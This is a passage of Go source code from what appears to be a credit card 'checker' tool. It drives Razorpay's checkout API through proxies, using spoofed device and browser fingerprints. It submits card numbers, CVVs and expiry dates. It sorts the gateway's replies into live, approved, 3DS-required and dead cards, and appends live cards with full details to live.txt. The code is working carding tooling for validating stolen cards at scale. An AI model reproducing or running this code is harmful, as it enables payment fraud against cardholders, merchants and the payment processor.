    rzpRef := fmt.Sprintf("https://api.razorpay.com/v1/checkout/public?traffic_env=production&build=%s&build_v1=%s&checkout_v2=1&new_session=1&unified_session_id=%s&session_token=%s",
        BUILD, BUILD_V1, rzpSessionID, sessid)

    stdHeaders := func() map[string]string {
        return map[string]string{
            "Accept":              "*/*",
            "Accept-Language":      "en-US,en;q=0.9",
            "Origin":             "https://api.razorpay.com",
            "Referer":            rzpRef,
            "x-session-token":    sessid,
            "x-rzb-shield-ips":   "false",
        }
    }

// ──────────────────────────────────────────────────────────────────────────────
//  VPA VALIDATION (enhanced from x64kbitters script)
// ──────────────────────────────────────────────────────────────────────────────

    // Use configured VPA or generate one
    vpaToUse := configuredVPA
    if vpaToUse == "" {
        vpaToUse = genVPA()
    }

    vpaForm := url.Values{
        "entity":        {"vpa"},
        "value":         {vpaToUse},
        "_[library]":   {"checkoutjs"},
    }

    log.Printf("[DEBUG] Validating VPA: %s", vpaToUse[:6]+"*****"+vpaToUse[len(vpaToUse)-4:])

    vpaResp, vpaErr := fetch.PostForm(
        fmt.Sprintf("https://api.razorpay.com/v1/standard_checkout/payments/validate/account?key_id=%s&session_token=%s&keyless_header=%s", kyid, sessid, keylessHeader),
        map[string]string{
            "Content-type":    "application/x-www-form-urlencoded",
            "x-session-token": sessid,
            "Cookie":          "user_fingerprint_v2=df3b0f0879e7309fd1df2d4902f088a3b064ce9a048fe8de7a54ce03512f9fa5; testcookie=1",
        },
        vpaForm,
    )

    var vpaToken, maskedVPA string
    if vpaErr == nil {
        var vpaData map[string]interface{}
        if json.Unmarshal([]byte(vpaResp.Text()), &vpaData) == nil {
            vpaToken = getStringFromMap(vpaData, "vpa_token")
            maskedVPA = getStringFromMap(vpaData, "masked_vpa")
            if vpaToken != "" {
                log.Printf("[DEBUG] VPA Validated: Token=%s...", vpaToken[:min(30, len(vpaToken))])
                log.Printf("[DEBUG] Masked VPA: %s", maskedVPA)
            } else {
                log.Printf("[DEBUG] VPA validation failed or returned no token")
            }
        } else {
            log.Printf("[DEBUG] VPA response parse failed")
        }
    } else {
        log.Printf("[DEBUG] VPA request failed: %v", vpaErr)
    }
    // VPA validation is optional - continue even if it fails
    _ = vpaToken

// ──────────────────────────────────────────────────────────────────────────────
//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
// ──────────────────────────────────────────────────────────────────────────────

    {
        resources := []string{"checkout_version_config", "merchant", "merchant_features", "downtime", "customer", "customer_tokens", "truecaller", "methods", "experiments", "offers", "checkout_config", "order", "invoice", "buyer_protection", "personalization"}
        queryArr := make([]map[string]string, 0, len(resources))
        for _, r := range resources {
            queryArr = append(queryArr, map[string]string{"resource": r})
        }

        r4Payload := map[string]interface{}{
            "query": queryArr,
            "query_params": map[string]interface{}{
                "device_id":       rzpDeviceID,
                "rtb_device_id":   fhash,
                "amount":          orderAmount,
                "currency":        orderCurrency,
                "option_currency": orderCurrency,
                "truecaller":      false,
                "qr_required":     false,
                "library":         "checkoutjs",
                "platform":        "browser",
                "order_id":        orderID,
                "payment_link_id": plink,
                "contact":         phone,
            },
            "action": "get",
        }

        h := stdHeaders()
        h["Content-Type"] = "application/json"
        fetch.PostJSON(
            fmt.Sprintf("https://api.razorpay.com/v2/standard_checkout/preferences?x_entity_id=%s&session_token=%s&keyless_header=%s", orderID, sessid, keylessHeader),
            h, r4Payload,
        )
    }

// ──────────────────────────────────────────────────────────────────────────────
//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
// ──────────────────────────────────────────────────────────────────────────────

    {
        form5 := url.Values{
            "notes[email]":          {email},
            "notes[phone]":          {phoneShort},
            "payment_link_id":       {plink},
            "key_id":                {kyid},
            "contact":               {phone},
            "email":                 {email},
            "currency":              {orderCurrency},
            "_[integration]":        {"payment_pages"},
            "_[device.id]":          {rzpDeviceID},
            "_[library]":            {"checkoutjs"},
            "_[library_src]":        {"no-src"},
            "_[current_script_src]": {"no-src"},
            "_[platform]":           {"browser"},
            "_[env]":                {""},
            "_[is_magic_script]":    {"false"},
            "_[os]":                 {"windows"},
            "_[shield][fhash]":      {fhash},
            "_[shield][tz]":         {"0"},
            "_[device_id]":          {rzpDeviceID},
            "_[build]":              {BUILD},
            "_[shield][os]":         {"windows"},
            "_[shield][platform]":   {"browser"},
            "_[shield][browser]":    {"chrome"},
            "_[request_index]":      {"0"},
            "amount":                {fmt.Sprintf("%.0f", orderAmount)},
            "order_id":              {orderID},
            "method":                {"card"},
            "checkout_id":           {checkoutID},
        }

        h := stdHeaders()
        h["Content-Type"] = "application/x-www-form-urlencoded"
        fetch.PostForm(
            fmt.Sprintf("https://api.razorpay.com/v1/standard_checkout/checkout/order?key_id=%s&session_token=%s&keyless_header=%s", kyid, sessid, keylessHeader),
            h, form5,
        )
    }

// ──────────────────────────────────────────────────────────────────────────────
//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
// ──────────────────────────────────────────────────────────────────────────────

    {
        r6Payload := map[string]interface{}{
            "identifiers": map[string]interface{}{
                "merchant":         map[string]string{"country": "IN"},
                "card":             map[string]interface{}{"country": "US", "dcc_blacklist": false, "network": brand},
                "method":           "card",
                "payment_currency": orderCurrency,
            },
            "forex_charges": map[string]interface{}{
                "amount":   orderAmount,
                "currency": orderCurrency,
                "filters":  map[string]string{"method": "card"},
            },
        }

        h := stdHeaders()
        h["Content-Type"] = "application/json"
        fetch.PostJSON(
            fmt.Sprintf("https://api.razorpay.com/payments_cross_border_live/v1/checkout/cb_flows?x_entity_id=%s&keyless_header=%s", orderID, keylessHeaderURL),
            h, r6Payload,
        )
    }

// ──────────────────────────────────────────────────────────────────────────────
//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
// ──────────────────────────────────────────────────────────────────────────────

    tokenCreate := base64.StdEncoding.EncodeToString([]byte(`[{"name":"sardine","metadata":{"session_id":"` + checkoutID + `"}}]`))

    form7 := url.Values{
        "user_risk_providers_token": {tokenCreate},
        "notes[comment]":            {""},
        "notes[email]":              {email},
        "notes[phone]":              {phoneShort},
        "notes[name]":               {nameOnCard},
        "payment_link_id":           {plink},
        "key_id":                    {kyid},
        "contact":                   {phone},
        "email":                     {email},
        "currency":                  {orderCurrency},
        "_[integration]":            {"payment_pages"},
        "_[checkout_id]":            {checkoutID},
        "_[device.id]":              {rzpDeviceID},
        "_[env]":                    {""},
        "_[library]":                {"checkoutjs"},
        "_[library_src]":            {"no-src"},
        "_[current_script_src]":     {"no-src"},
        "_[is_magic_script]":        {"false"},
        "_[platform]":               {"browser"},
        "_[referer]":                {targetURL},
        "_[shield][fhash]":          {fhash},
        "_[shield][tz]":             {"-330"},
        "_[device_id]":              {rzpDeviceID},
        "_[build]":                  {BUILD},
        "_[shield][os]":             {"windows"},
        "_[shield][platform]":       {"browser"},
        "_[shield][browser]":        {"chrome"},
        "_[request_index]":          {"1"},
        "amount":                    {fmt.Sprintf("%.0f", orderAmount)},
        "order_id":                  {orderID},
        "method":                    {"card"},
        "card[number]":              {cc},
        "card[cvv]":                 {cvv},
        "card[name]":                {nameOnCard},
        "card[expiry_month]":        {mm},
        "card[expiry_year]":         {strconv.Itoa(year)},
        "save":                      {"0"},
        "dcc_currency":              {orderCurrency},
        // BILLING ADDRESS - Required by RBI rules (learned from x64kbitters checker)
        "billing_address[country]":     {"IN"},
        "billing_address[postal_code]": {"360001"},
        "billing_address[city]":         {"Rajkot"},
        "billing_address[state]":        {"Gujarat"},
        "billing_address[line1]":        {"Na"},
        "billing_address[line2]":        {"Na"},
        // Additional fields from x64kbitters
        "currency_request_id":      {checkoutID},
        "_[shield_context]":        {""},
    }

    r7, err := fetch.PostForm(
        fmt.Sprintf("https://api.razorpay.com/v1/standard_checkout/payments/create/ajax?x_entity_id=%s&session_token=%s&keyless_header=%s", orderID, sessid, keylessHeader),
        stdHeaders(),
        form7,
    )
    if err != nil {
        return makeProxyError(err, proxyURL)
    }

    respText := r7.Text()

    // Debug logging like x64kbitters script
    debugLogFile := "debug_payment.log"
    debugEntry := fmt.Sprintf("========================================\nPayment Response for Card: %s******%s\nTimestamp: %s\n%s\n========================================\n",
        cc[:min(6, len(cc))], cc[len(cc)-min(4, len(cc)):], time.Now().Format("2006-01-02 15:04:05"), respText)
    if f, err := os.OpenFile(debugLogFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644); err == nil {
        f.WriteString(debugEntry)
        f.Close()
    }

    log.Printf("[DEBUG] Payment create response raw:")
    // Pretty print JSON for debugging
    var prettyJSON map[string]interface{}
    if json.Unmarshal([]byte(respText), &prettyJSON) == nil {
        if prettyBytes, err := json.MarshalIndent(prettyJSON, "", "  "); err == nil {
            log.Printf("[DEBUG] %s", string(prettyBytes))
        }
    } else {
        log.Printf("[DEBUG] %s", respText)
    }

    var r7Data map[string]interface{}
    if err := json.Unmarshal([]byte(r7.Text()), &r7Data); err != nil {
        return CheckResult{Status: "error", Message: "Payment create response parse failed", Proxy: proxyURL, ProxyStatus: "LIVE"}
    }

    // Check for payment_id in the response or in error metadata
    paymentID := getStringFromMap(r7Data, "payment_id")
    if paymentID == "" {
        paymentID = getStringFromMap(r7Data, "id")
    }
    
    // Also check in error metadata
    if paymentID == "" {
        if errMeta, ok := r7Data["error"].(map[string]interface{}); ok {
            if meta, ok2 := errMeta["metadata"].(map[string]interface{}); ok2 {
                paymentID = getStringFromMap(meta, "payment_id")
            }
        }
    }

    // Extract initial error info from payment response (for logging/fallback)
    var initialErrCode, initialErrDesc string
    var hasInitialError bool
    if errObj, ok := r7Data["error"].(map[string]interface{}); ok {
        initialErrCode = getStringFromMap(errObj, "code")
        initialErrDesc = getStringFromMap(errObj, "description")
        hasInitialError = initialErrCode != "" || initialErrDesc != ""
    }

    // ───────────────────────────────────────────────────────────────
    // EXACT MATCH: x64kbitters.sh response logic
    // ───────────────────────────────────────────────────────────────

    // STEP 1: Check for ERROR first (like bash script line 273-293)
    if hasInitialError {
        errCode := initialErrCode
        errDesc := initialErrDesc

        // All errors go to DECLINED (matching bash)
        status, message := classifyError(errCode, errDesc, respText)
        return CheckResult{Status: status, Message: message, Proxy: proxyURL, ProxyStatus: "LIVE"}
    }

    // STEP 2: Check for 3DS keywords (like bash line 296-307)
    respLower := strings.ToLower(respText)
    threedsKeywords := []string{"3ds", "3-ds", "three_ds", "authentication", "redirect", "verify", "otp", "challenge"}
    for _, k := range threedsKeywords {
        if strings.Contains(respLower, k) {
            return CheckResult{Status: "declined", Message: "3DS Authentication Required [3DS_REQUIRED]", Proxy: proxyURL, ProxyStatus: "LIVE"}
        }
    }

    // STEP 3: Check for SUCCESS (like bash line 309-323)
    if strings.Contains(respLower, "success") && strings.Contains(respLower, "true") {
        return CheckResult{Status: "charged", Message: "Payment Successful [CHARGED]", Proxy: proxyURL, ProxyStatus: "LIVE"}
    }

    // STEP 4: Check for declined keywords (like bash line 325-337)
    declinedKeywords := []string{"declined", "denied", "rejected", "failed", "expired", "insufficient", "not allowed", "no funds"}
    for _, k := range declinedKeywords {
        if strings.Contains(respLower, k) {
            return CheckResult{Status: "declined", Message: "Card Declined [DECLINED]", Proxy: proxyURL, ProxyStatus: "LIVE"}
        }
    }

    // STEP 5: Unknown response (like bash line 340-350)
    return CheckResult{Status: "declined", Message: "Unknown Response [UNKNOWN]", Proxy: proxyURL, ProxyStatus: "LIVE"}

// ──────────────────────────────────────────────────────────────────────────────
//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
// ──────────────────────────────────────────────────────────────────────────────

    pidClean := paymentID
    // Only clean if it has a prefix we need to remove
    if idx := strings.Index(paymentID, "_"); idx != -1 && !strings.HasPrefix(paymentID, "pay_") {
        pidClean = paymentID[idx+1:]
    }

    // Use clean payment ID for authenticate - but if it's already in pay_XXX format use it as-is
    authID := paymentID
    if !strings.HasPrefix(authID, "pay_") {
        authID = pidClean
    }

    {
        fetch.PostForm(
            fmt.Sprintf("https://api.razorpay.com/pg_router/v1/payments/%s/authenticate", authID),
            map[string]string{"content-type": "application/x-www-form-urlencoded"},
            url.Values{},
        )
    }

    time.Sleep(1 * time.Second)

    {
        screens := [][]int{{1920, 1080}, {1366, 768}, {1536, 864}, {1440, 900}}
        screen := screens[randInt(0, len(screens)-1)]
        depths := []int{24, 32}
        depth := depths[randInt(0, 1)]

        form8 := url.Values{
            "browser[java_enabled]":       {"false"},
            "browser[javascript_enabled]": {"true"},
            "browser[timezone_offset]":    {"0"},
            "browser[color_depth]":        {strconv.Itoa(depth)},
            "browser[screen_width]":       {strconv.Itoa(screen[0])},
            "browser[screen_height]":      {strconv.Itoa(screen[1])},
            "browser[language]":           {"en-US"},
            "auth_step":                   {"3ds2Auth"},
        }

        fetch.PostForm(
            fmt.Sprintf("https://api.razorpay.com/pg_router/v1/payments/%s/authenticate", authID),
            map[string]string{"content-type": "application/x-www-form-urlencoded"},
            form8,
        )
    }

// ──────────────────────────────────────────────────────────────────────────────
//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
// ──────────────────────────────────────────────────────────────────────────────

    // For cancel, use payment ID - but if paymentID is in the error metadata, it's not valid for cancel
    // Use order_id from metadata instead
    cancelID := orderID
    if errMeta, ok := r7Data["error"].(map[string]interface{}); ok {
        if meta, ok2 := errMeta["metadata"].(map[string]interface{}); ok2 {
            if oid := getStringFromMap(meta, "order_id"); oid != "" {
                cancelID = oid
            }
        }
    }
    
    r9, err := fetch.Get(
        fmt.Sprintf("https://api.razorpay.com/v1/standard_checkout/payments/%s/cancel?key_id=%s&session_token=%s&keyless_header=%s", cancelID, kyid, sessid, keylessHeader),
        map[string]string{
            "Accept":          "*/*",
            "Content-type":    "application/x-www-form-urlencoded",
            "Referer":         rzpRef,
            "x-session-token": sessid,
        },
    )
    if err != nil {
        return makeProxyError(err, proxyURL)
    }

    var r9Data map[string]interface{}
    if err := json.Unmarshal([]byte(r9.Text()), &r9Data); err != nil {
        // If cancel parse fails but we had initial error info, use that
        if hasInitialError {
            status, message := classifyError(initialErrCode, initialErrDesc, "")
            return CheckResult{Status: status, Message: message, Proxy: proxyURL, ProxyStatus: "LIVE"}
        }
        return CheckResult{Status: "declined", Message: "Cancel response parse failed", Proxy: proxyURL, ProxyStatus: "LIVE"}
    }

    finalText := r9.Text()

    if strings.Contains(finalText, "razorpay_payment_id") {
        return CheckResult{Status: "charged", Message: "Payment Successful [CHARGED]", Proxy: proxyURL, ProxyStatus: "LIVE"}
    }

    // Try to get error from cancel response
    errorObj, _ := r9Data["error"].(map[string]interface{})
    errCode := getStringFromMap(errorObj, "reason")
    errDesc := getStringFromMap(errorObj, "description")
    fullResponse := r9.Text()
    
    // Use cancel response error UNLESS it's too generic, then use initial error as fallback
    // If we have initial SERVER_ERROR from payment step, use that only if cancel is empty/generic
    if hasInitialError && (errCode == "" || errDesc == "") {
        errCode = initialErrCode
        errDesc = initialErrDesc
    }
    // Also if cancel returned "not found" or "id provided does not exist", use initial error
    if hasInitialError {
        lowerResp := strings.ToLower(fullResponse)
        if strings.Contains(lowerResp, "not found") || strings.Contains(lowerResp, "does not exist") || strings.Contains(lowerResp, "input_validation_failed") {
            errCode = initialErrCode
            errDesc = initialErrDesc
        }
    }
    
    // Use the new error classification system (matching x64kbitters bash script)
    status, message := classifyError(errCode, errDesc, fullResponse)

    // IMPORTANT: The x64kbitters script treats ALL errors as DECLINED
    // Even SERVER_ERROR - the card might be live but we can't confirm
    // So we keep it as "declined" status (not charged/approved)
    // The error code shows what happened

    return CheckResult{Status: status, Message: message, Proxy: proxyURL, ProxyStatus: "LIVE"}
}

// ──────────────────────────────────────────────────────────────────────────────
//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
// ──────────────────────────────────────────────────────────────────────────────

func getStringFromMap(m map[string]interface{}, key string) string {
    if m == nil {
        return ""
    }
    v, ok := m[key]
    if !ok {
        return ""
    }
    if s, ok := v.(string); ok {
        return s
    }
    return fmt.Sprintf("%v", v)
}

func getFloatFromMap(m map[string]interface{}, key string) float64 {
    if m == nil {
        return 0
    }
    v, ok := m[key]
    if !ok {
        return 0
    }
    switch val := v.(type) {
    case float64:
        return val
    case int:
        return float64(val)
    case int64:
        return float64(val)
    case string:
        f, _ := strconv.ParseFloat(val, 64)
        return f
    }
    return 0
}

func min(a, b int) int {
    if a < b {
        return a
    }
    return b
}

func truncate(s string, maxLen int) string {
    if len(s) <= maxLen {
        return s
    }
    return s[:maxLen]
}

// ═════════════════════════════════════════════════════════════════════════════
//  ERROR CLASSIFICATION SYSTEM
// ═════════════════════════════════════════════════════════════════════════════

// Approved keywords - cards with these errors are LIVE and have funds
var approvedKeywords = []string{
    "insufficient account balance",
    "insufficient funds",
    "maximum transaction limit",
    "transaction limit exceeded",
    "insufficient balance",
    "not enough funds",
    "exceeds limit",
    "daily limit exceeded",
    "monthly limit exceeded",
}

// CVV rejection keywords - CVV is incorrect
var cvvKeywords = []string{
    "cvv provided is incorrect",
    "ncorrect_cvv",
    "incorrect cvv",
    "cvv mismatch",
    "invalid cvv",
    "cvc incorrect",
    "security code incorrect",
}

// 3DS / Authentication keywords
var threedsKeywords = []string{
    "3ds",
    "3-ds",
    "three_ds",
    "authentication failed",
    "authentication denied",
    "verified by visa",
    "mastercard securecode",
    "otp not entered",
    "one time password",
    "verification failed",
    "cardinal error",
    "redirect",
    "verify",
    "otp",
    "challenge",
}

// Card blocked / Dead card keywords
var deadCardKeywords = []string{
    "card blocked",
    "card expired",
    "expired card",
    "invalid card number",
    "card number invalid",
    "incorrect card number",
    "card type mismatch",
    "issuer declined",
    "do not honor",
    "call card issuer",
    "lost card",
    "stolen card",
    "fraud suspected",
    "transaction not permitted",
    "restricted card",
}

// Gateway errors - network/server issues
var gatewayKeywords = []string{
    "gateway error",
    "network error",
    "connection timeout",
    "acquirer error",
    "processor error",
}

// Server errors - Razorpay side issues
var serverErrorKeywords = []string{
    "server encountered an error",
    "try again",
    "service unavailable",
}

// Payment method declined
var paymentDeclinedKeywords = []string{
    "payment failed",
    "payment declined",
    "transaction declined",
    "bank declined",
    "declined by issuer",
}

// ────────────────────────────────────────────────────────────���──────────────────────────────────
//  ERROR CLASSIFICATION FUNCTIONS
// ───────────────────────────────────────────────────────────────────────────────────────────────

// Classify error and return result with proper status
func classifyError(errCode, errDesc, fullResponse string) (status, message string) {
    msgLower := strings.ToLower(errDesc)
    fullLower := strings.ToLower(fullResponse)
    
    // Check for APPROVED cards (funds available)
    for _, k := range approvedKeywords {
        if strings.Contains(msgLower, strings.ToLower(k)) {
            return "approved", formatErrorMessage(errDesc, errCode, "INSUFFICIENT FUNDS")
        }
    }
    
    // Check for CVV errors
    for _, k := range cvvKeywords {
        if strings.Contains(msgLower, strings.ToLower(k)) || strings.Contains(fullLower, strings.ToLower(k)) {
            return "approved", formatErrorMessage(errDesc, errCode, "INCORRECT CVV")
        }
    }
    if strings.ToLower(errCode) == "incorrect_cvv" {
        return "approved", formatErrorMessage(errDesc, errCode, "INCORRECT CVV")
    }
    
    // Check for 3DS errors
    for _, k := range threedsKeywords {
        if strings.Contains(msgLower, strings.ToLower(k)) {
            return "declined", formatErrorMessage(errDesc, errCode, "3DS REQUIRED")
        }
    }
    
    // Check for dead cards
    for _, k := range deadCardKeywords {
        if strings.Contains(msgLower, strings.ToLower(k)) {
            return "declined", formatErrorMessage(errDesc, errCode, "CARD DEAD")
        }
    }
    
    // Check for gateway errors
    for _, k := range gatewayKeywords {
        if strings.Contains(msgLower, strings.ToLower(k)) {
            return "error", formatErrorMessage(errDesc, errCode, "GATEWAY ERROR")
        }
    }
    
    // Check for server errors
    for _, k := range serverErrorKeywords {
        if strings.Contains(msgLower, strings.ToLower(k)) {
            return "declined", formatErrorMessage(errDesc, errCode, "SERVER_ERROR")
        }
    }
    
    // Check for payment declined
    for _, k := range paymentDeclinedKeywords {
        if strings.Contains(msgLower, strings.ToLower(k)) {
            return "declined", formatErrorMessage(errDesc, errCode, "PAYMENT DECLINED")
        }
    }
    
    // Check specific error codes
    switch strings.ToLower(errCode) {
    case "bad_request_error":
        if strings.Contains(msgLower, "expired") || strings.Contains(msgLower, "expiry") {
            return "declined", formatErrorMessage(errDesc, errCode, "CARD_EXPIRED")
        }
        if strings.Contains(msgLower, "invalid") {
            if strings.Contains(msgLower, "card number") || strings.Contains(msgLower, "card no") {
                return "declined", formatErrorMessage(errDesc, errCode, "INVALID_CARD")
            }
            if strings.Contains(msgLower, "expir") {
                return "declined", formatErrorMessage(errDesc, errCode, "CARD_EXPIRED")
            }
            return "declined", formatErrorMessage(errDesc, errCode, "INVALID_CARD")
        }
    case "server_error":
        return "declined", formatErrorMessage(errDesc, errCode, "SERVER_ERROR")
    case "gateway_error":
        return "declined", formatErrorMessage(errDesc, errCode, "GATEWAY_ERROR")
    case "gateway_timeout":
        return "error", formatErrorMessage(errDesc, errCode, "GATEWAY_TIMEOUT")
    case "network_error":
        return "error", formatErrorMessage(errDesc, errCode, "NETWORK_ERROR")
    case "invalid_payment_method":
        return "declined", formatErrorMessage(errDesc, errCode, "INVALID_METHOD")
    case "payment_validation_failed":
        return "declined", formatErrorMessage(errDesc, errCode, "VALIDATION_FAILED")
    case "acquirer_error":
        return "declined", formatErrorMessage(errDesc, errCode, "ACQUIRER_ERROR")
    case "insufficient_balance":
        return "approved", formatErrorMessage(errDesc, errCode, "INSUFFICIENT_BALANCE")
    case "incorrect_cvv", "cvv_not_matched":
        return "approved", formatErrorMessage(errDesc, errCode, "INCORRECT_CVV")
    case "card_not_supported":
        return "declined", formatErrorMessage(errDesc, errCode, "CARD_NOT_SUPPORTED")
    case "invalid_expiry_date":
        return "declined", formatErrorMessage(errDesc, errCode, "INVALID_EXPIRY")
    case "expired_card":
        return "declined", formatErrorMessage(errDesc, errCode, "CARD_EXPIRED")
    case "input_validation_failed":
        return "declined", formatErrorMessage(errDesc, errCode, "VALIDATION_FAILED")
    case "do_not_honor":
        return "declined", formatErrorMessage(errDesc, errCode, "CARD_DEAD")
    case "blocked":
        return "declined", formatErrorMessage(errDesc, errCode, "CARD_DEAD")
    case "stolen_card", "lost_card":
        return "declined", formatErrorMessage(errDesc, errCode, "CARD_DEAD")
    case "fraud suspected", "fraudulent":
        return "declined", formatErrorMessage(errDesc, errCode, "CARD_DEAD")
    case "transaction_not_permitted":
        return "declined", formatErrorMessage(errDesc, errCode, "CARD_DEAD")
    case "restricted_card":
        return "declined", formatErrorMessage(errDesc, errCode, "CARD_DEAD")
    case "security_error":
        return "declined", formatErrorMessage(errDesc, errCode, "CARD_DEAD")
    case "invalid_amount":
        return "declined", formatErrorMessage(errDesc, errCode, "INVALID_AMOUNT")
    case "processing_error":
        return "declined", formatErrorMessage(errDesc, errCode, "PROCESSING_ERROR")
    case "issuer_error":
        return "declined", formatErrorMessage(errDesc, errCode, "ISSUER_ERROR")
    }
    
    // Default: if we got a payment_id, the card is live but declined
    return "declined", formatErrorMessage(errDesc, errCode, "DECLINED")
}

// Format error message with code for clarity
func formatErrorMessage(errDesc, errCode, errType string) string {
    // Clean up the Razorpay message
    errDesc = strings.ReplaceAll(errDesc, " Try another payment method or contact your bank for details.", "")
    errDesc = strings.TrimSpace(errDesc)
    
    // If description is empty or too generic, use the error type
    if errDesc == "" || errDesc == "The card was declined." {
        errDesc = getDefaultMessage(errType)
    }
    
    // Show internal error type as code
    if errType != "" {
        return errDesc + " [" + errType + "]"
    }
    if errCode != "" {
        return errDesc + " [" + errCode + "]"
    }
    return errDesc
}

// Get default message for error types
func getDefaultMessage(errType string) string {
    switch errType {
    case "INSUFFICIENT FUNDS":
        return "Insufficient Funds"
    case "INCORRECT CVV":
        return "Incorrect CVV"
    case "3DS_REQUIRED":
        return "3DS Authentication Required"
    case "CARD DEAD":
        return "Card Dead/Blocked"
    case "GATEWAY ERROR":
        return "Gateway Error"
    case "SERVER_ERROR":
        return "Server Error"
    case "PAYMENT DECLINED":
        return "Payment Declined"
    case "CARD_EXPIRED":
        return "Card Expired"
    case "INVALID_CARD":
        return "Invalid Card"
    case "INVALID_EXPIRY":
        return "Invalid Expiry Date"
    case "CARD_NOT_SUPPORTED":
        return "Card Not Supported"
    case "GATEWAY_TIMEOUT":
        return "Gateway Timeout"
    case "NETWORK_ERROR":
        return "Network Error"
    case "INVALID_METHOD":
        return "Invalid Payment Method"
    case "VALIDATION_FAILED":
        return "Validation Failed"
    case "ACQUIRER_ERROR":
        return "Acquirer Error"
    case "INSUFFICIENT_BALANCE":
        return "Insufficient Balance"
    case "INCORRECT_CVV":
        return "Incorrect CVV"
    case "INVALID_AMOUNT":
        return "Invalid Amount"
    case "PROCESSING_ERROR":
        return "Processing Error"
    case "ISSUER_ERROR":
        return "Issuer Error"
    case "GATEWAY_ERROR":
        return "Gateway Error"
    case "DECLINED":
        return "Card Declined"
    case "CHARGED":
        return "Payment Successful"
    default:
        return "Card Declined"
    }
}

// Legacy functions for backward compatibility
var balanceKeywords = []string{
    "insufficient account balance",
    "insufficient funds",
    "maximum transaction limit",
    "transaction limit exceeded",
}

func isBalanceKeyword(msgLower string) bool {
    for _, k := range balanceKeywords {
        if strings.Contains(msgLower, k) {
            return true
        }
    }
    return false
}

func isCVVKeyword(msgLower, errCode string) bool {
    for _, k := range cvvKeywords {
        if strings.Contains(msgLower, strings.ToLower(k)) {
            return true
        }
    }
    if strings.ToLower(errCode) == "incorrect_cvv" {
        return true
    }
    return false
}

// ──────────────────────────────────────────────────────────────────────────────
//  FORMATTERS FOR JSON OUTPUT (from x64kbitters script)
// ──────────────────────────────────────────────────────────────────────────────

// FormatCardMask creates a masked display of card for logging
func formatCardMask(cc string) string {
    if len(cc) < 10 {
        return "****"
    }
    return cc[:6] + "******" + cc[len(cc)-4:]
}

// FormatCardDisplay creates full card details display
func formatCardDisplay(cc, mm, yy, cvv, name string) string {
    return fmt.Sprintf(`
┌─────────────────────────────────────────────────────────┐
│ 💳 Card: %s
│ 📅 Expiry: %s/%s
│ 🔐 CVV: %s
│ 👤 Name: %s
│ 💰 Amount: ₹100.00
└─────────────────────────────────────────────────────────┘`, formatCardMask(cc), mm, yy, "***", name)
}

func showCardCheckHeader(cc, mm, yy, cvv, name string, processed, total int) string {
    brand := getBrand(cc)
    return fmt.Sprintf(`
╔════════════════════════════════════════════════════════════╗
║              🔍 CHECKING CARD %d/%d                    ║
╚════════════════════════════════════════════════════════════╝
%s
[BRAND: %s]`, processed, total, formatCardDisplay(cc, mm, yy, cvv, name), strings.ToUpper(brand))
}

func showPaymentResponseJSON(respText string) {
    // Parse and pretty print JSON
    var data map[string]interface{}
    if err := json.Unmarshal([]byte(respText), &data); err == nil {
        if pretty, err := json.MarshalIndent(data, "", "  "); err == nil {
            log.Printf("[JSON] %s", string(pretty))
        }
    } else {
        log.Printf("[JSON] %s", respText)
    }
}

// ──────────────────────────────────────────────────────────────────────────────
//  OUTPUT FILE HANDLING (from x64kbitters script)
// ──────────────────────────────────────────────────────────────────────────────

const (
    OutputLive     = "live.txt"
    OutputDeclined = "declined.txt"
    Output3DS     = "3ds.txt"
    OutputUnknown = "unknown.txt"
    OutputDebug   = "debug_payment.log"
)

// InitOutputFiles creates/clears all output files
func initOutputFiles() {
    files := []string{OutputLive, OutputDeclined, Output3DS, OutputUnknown, OutputDebug}
    for _, f := range files {
        if file, err := os.Create(f); err == nil {
            file.Close()
        }
    }
}

// WriteLive writes a live card to live.txt
func writeLive(cc, mm, yy, cvv, name string) {
    line := fmt.Sprintf("%s|%s|%s|%s|%s\n", cc, mm, yy, cvv, name)
    if file, err := os.OpenFile(OutputLive, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644); err == nil {
        file.WriteString(line)
        file.Close()
    }
}

// WriteDeclined writes a declined card
func writeDeclined(cc, mm, yy, cvv, name, errorCode, errorMsg string) {
    line := fmt.Sprintf("%s|%s|%s|%s|%s|%s|%s\n", cc, mm, yy, cvv, name, errorCode, errorMsg)
    if file, err := os.OpenFile(OutputDeclined, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644); err == nil {
        file.WriteString(line)
        file.Close()
    }
}

// Write3DS writes a 3DS required card
func write3DS(cc, mm, yy, cvv, name string) {
    line := fmt.Sprintf("%s|%s|%s|%s|%s\n", cc, mm, yy, cvv, name)
    if file, err := os.OpenFile(Output3DS, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644); err == nil {
        file.WriteString(line)
        file.Close()
    }
}

// WriteUnknown writes an unknown response card
func writeUnknown(cc, mm, yy, cvv, name string) {
    line := fmt.Sprintf("%s|%s|%s|%s|%s\n", cc, mm, yy, cvv, name)
    if file, err := os.OpenFile(OutputUnknown, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644); err == nil {
        file.WriteString(line)
        file.Close()
    }
}

// WriteDebugLog writes payment response to debug log
func writeDebugLog(cc, respText string) {
    entry := fmt.Sprintf("========================================\nPayment Response for Card: %s\nTimestamp: %s\n%s\n========================================\n",
        formatCardMask(cc), time.Now().Format("2006-01-02 15:04:05"), respText)
    if file, err := os.OpenFile(OutputDebug, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644); err == nil {
        file.WriteString(entry)
        file.Close()
    }
}

// ReadOutputFiles reads and displays all output files
func readOutputFiles() string {
    var result strings.Builder
    files := map[string]string{
        OutputLive:     "LIVE CARDS",
        OutputDeclined: "DECLINED CARDS",
        Output3DS:     "3DS REQUIRED",
        OutputUnknown: "UNKNOWN",
    }

    for filename, title := range files {
        result.WriteString(fmt.Sprintf("\n📄 %s:\n", title))
        result.WriteString("────────────────────────────────────────────────────────\n")
        if data, err := os.ReadFile(filename); err == nil && len(data) > 0 {
            result.WriteString(string(data))
        } else {
            result.WriteString("No cards yet\n")
        }
    }
    return result.String()
}

